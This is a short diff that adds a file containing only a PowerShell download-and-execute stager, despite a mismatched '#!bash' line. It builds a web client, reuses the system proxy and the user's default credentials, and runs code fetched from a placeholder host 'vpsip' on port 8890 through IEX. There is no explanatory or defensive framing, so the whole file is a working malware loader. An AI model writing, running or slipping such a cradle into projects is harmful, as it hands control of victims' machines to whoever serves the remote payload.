@@ -1,0 +1,5 @@
+#!bash
+$n=new-object net.webclient;
+$n.proxy=[Net.WebRequest]::GetSystemWebProxy();
+$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
+IEX $n.downloadstring('http://vpsip:8890/');
